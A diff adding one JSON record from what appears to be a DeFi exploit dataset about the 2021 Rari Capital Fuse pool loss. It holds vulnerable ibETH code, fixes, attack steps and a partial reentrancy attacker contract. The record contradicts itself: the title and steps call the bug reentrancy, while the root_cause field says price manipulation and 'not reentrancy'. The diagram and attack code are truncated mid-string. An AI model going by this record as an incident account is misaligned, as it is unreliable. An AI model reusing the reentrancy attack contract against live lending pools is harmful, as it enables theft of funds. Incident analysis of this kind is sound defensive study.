@@ -1,0 +1,39 @@
+{
+ "id": "2021__2021-05-08_RariCapital_ibETH_PriceManipulation",
+ "source_file": "2021/2021-05-08_RariCapital_ibETH_PriceManipulation.md",
+ "title": "Rari Capital — ERC-20 Hook Reentrancy Vulnerability Analysis",
+ "date": "2021-05-08",
+ "protocol": "Rari Capital",
+ "chain": "Ethereum",
+ "loss_raw": "~$11,000,000",
+ "loss_usd": 11000000.0,
+ "root_cause": "ibETH (Alpha Finance) exposes a `work()` function that makes arbitrary external calls and updates `totalETH()` — the internal balance tracker Rari used to price ibETH collateral. Attacker crafted a `work()` call that inflated `totalETH()` without adding real ETH, raising the apparent ibETH price and enabling over-borrowing (protocol incompatibility / price manipulation, not reentrancy)",
+ "attack_tx": "Address unidentified (fork block: 12,394,009)",
+ "vulnerable_contract": "Rari Capital Fuse Pool (CEther market `borrow()`)",
+ "classes": [
+  "other"
+ ],
+ "code_before": [
+  "function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data)\n    external payable\n    onlyEOA accrue(msg.value) nonReentrant\n{\n    // 1. Sanity check the input position, or add a new position of ID is 0.\n    if (id == 0) {\n        id = nextPositionID++;\n        positions[id].goblin = goblin;\n        positions[id].owner = msg.sender;\n    } else {\n        require(id < nextPositionID, \"bad position id\");\n        require(positions[id].goblin == goblin, \"bad position goblin\");\n        require(positions[id].owner == msg.sender, \"not position owner\");\n    }\n    emit Work(id, loan);\n    // 2. Make sure the goblin can accept more debt and remove the existing debt.\n    require(config.isGoblin(goblin), \"not a goblin\");\n    require(loan == 0 || config.acceptDebt(goblin), \"goblin not accept more debt\");\n    uint256 debt = _removeDebt(id).add(loan);\n    // 3. Perform the actual work, using a new scope to avoid stack-too-deep errors.\n    uint256 back;\n    {\n        uint256 sendETH = msg.value.add(loan);\n        require(sendETH <= address(this).balance, \"insufficient ETH in the bank\");\n        uint256 beforeETH = address(this).balance.sub(sendETH);\n        Goblin(goblin).work.value(sendETH)(id, msg.sender, debt, data); // ❌ External call to attacker-controlled goblin\n        back = address(this).balance.sub(beforeETH);\n    }\n    // 4. Check and update position debt.\n    uint256 lessDebt = Math.min(debt, Math.min(back, maxReturn));\n    debt = debt.sub(lessDebt);\n    if (debt > 0) {\n        require(debt >= config.minDebtSize(), \"too small debt size\");\n        uint256 health = Goblin(goblin).health(id);\n        uint256 workFactor = config.workFactor(goblin, debt);\n        require(health.mul(workFactor) >= debt.mul(10000), \"bad work factor\");\n        _addDebt(id, debt);\n    }\n    // 5. Return excess ETH back.\n    if (back > lessDebt) SafeToken.safeTransferETH(msg.sender, back - lessDebt);\n}",
+  "function totalETH() public view returns (uint256) {\n    return address(this).balance.add(glbDebtVal).sub(reservePool);\n    // ❌ address(this).balance reflects the Bank's actual ETH balance\n    //    During work(), ETH is transferred out to the goblin and can be returned\n    //    via crafted payloads that inflate glbDebtVal without corresponding real ETH\n}",
+  "function deposit() external payable accrue(msg.value) nonReentrant {\n    uint256 total = totalETH().sub(msg.value);\n    uint256 share = total == 0 ? msg.value : msg.value.mul(totalSupply()).div(total);\n    // ❌ totalETH() is the oracle Rari reads for ibETH collateral price\n    //    If totalETH() is inflated (more ETH \"accounted\" than really present),\n    //    each ibETH share appears more valuable than it truly is\n    _mint(msg.sender, share);\n}"
+ ],
+ "code_after": [
+  "// ✅ Fix: Never use an AMM's or vault's own internal balance tracker as a price oracle.\n// Use a hardened external oracle (Chainlink TWAP) for ibETH/ETH pricing.\n// Additionally, whitelist acceptable collateral types and audit their full interfaces\n// before listing — specifically any privileged functions that affect balance accounting.",
+  "// ✅ Two defenses required together:\n\n// 1. Apply nonReentrant to all state-mutating functions\nfunction borrow(uint borrowAmount) external nonReentrant returns (uint) {\n    return borrowFresh(payable(msg.sender), borrowAmount);\n}\n\n// 2. Strictly follow CEI: update accountBorrows BEFORE doTransferOut()\nfunction borrowFresh(address payable borrower, uint borrowAmount) internal returns (uint) {\n    // Checks\n    uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);\n    require(allowed == 0, \"not allowed\");\n\n    // Effects (state first)\n    accountBorrows[borrower].principal = accountBorrowsNew;\n    totalBorrows = totalBorrowsNew;\n\n    // Interactions (external call last)\n    doTransferOut(borrower, borrowAmount);\n    return uint(Error.NO_ERROR);\n}"
+ ],
+ "steps": [
+  "Step 1: Deposit ibETH (Alpha Finance) as collateral",
+  "Step 2: Call CEther.borrow(borrowAmount) on Fuse Pool",
+  "Step 3: doTransferOut() sends ETH to attacker contract",
+  "→ attacker.receive() fires (borrow balance NOT yet updated)",
+  "Step 4: receive() callback reenters CEther.borrow()",
+  "→ liquidity check passes again (stale balance still = 0)",
+  "→ second borrow succeeds against same collateral",
+  "Step 5: Control returns; original borrow balance finally set"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────────┐\n│ Step 1: Deposit ibETH (Alpha Finance) as collateral          │\n│ into Rari Capital Fuse Pool 18/19                            │\n└─────────────────────┬────────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────────┐\n│ Step 2: Call CEther.borrow(borrowAmount) on Fuse Pool        │\n│ Liquidity check passes (sufficient ibETH collateral)         │\n└─────────────────────┬────────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────────┐\n│ Step 3: doTransferOut() sends ETH to attacker contract       │\n│ → attacker.receive() fires (borrow balance NOT yet updated)  │\n└─────────────────────┬──────────────",
+  "// testExploit() — fork block 12,394,009\n// Attack uses ibETH ERC-677 callback to reenter borrow()\n\ncontract RariAttacker {\n    IRariFusePool pool;\n    IibETH ibETH;\n\n    // Called when ETH is sent during pool.borrow()\n    receive() external payable {\n        // Reenter borrow() before first borrow's balance is written\n        // Liquidity check sees stale (zero) borrow balance → allows second borrow\n        pool.borrow(borrowAmount);\n    }\n\n    function attack() external {\n        // Supply ibETH as collateral\n        ibETH.approve(address(pool), type(uint256).max);\n        pool.mint(collateralAmount);        // deposit ibETH\n        pool.enterMarkets(new address[](1)); // register as collateral\n\n        // First borrow — triggers receive() → reentrancy → second borrow\n        pool.borrow"
+ ]
+}
